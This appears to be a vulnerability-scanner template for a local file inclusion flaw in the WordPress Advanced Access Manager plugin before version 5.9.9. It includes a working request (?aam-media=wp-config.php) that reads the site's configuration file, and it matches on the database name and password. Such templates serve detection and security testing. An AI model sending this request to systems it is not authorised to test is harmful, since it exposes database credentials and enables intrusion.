id: advanced-access-manager-lfi
name: WordPress Advanced Access Manager < 5.9.9 - Local File Inclusion
severity: high
confidence: tentative
description: WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers
  to download the wp-config.php file and get access to the database, which is publicly reachable on many servers.
reference: CWE-22
tags:
- wordpress
- wp-plugin
- lfi
- wp
- accessmanager
- wpscan
- vuln
requests:
- method: GET
  path: /?aam-media=wp-config.php
  matchers:
  - type: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  condition: and
